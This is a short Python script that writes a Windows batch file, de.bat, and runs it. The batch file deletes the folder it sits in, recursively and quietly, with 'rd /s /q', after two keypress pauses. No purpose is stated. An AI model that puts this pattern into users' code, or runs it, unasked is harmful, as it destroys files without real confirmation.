import os
def delete_all():
    n=open("de.bat",'w')
    n.write("""
@echo off
cd /d "%~dp0"
echo Deleting folder: %cd%
pause
rd /s /q "%cd%"
echo Folder deleted.
pause""")
    n.close()
def sl3():
    delete_all()
    os.startfile("de.bat")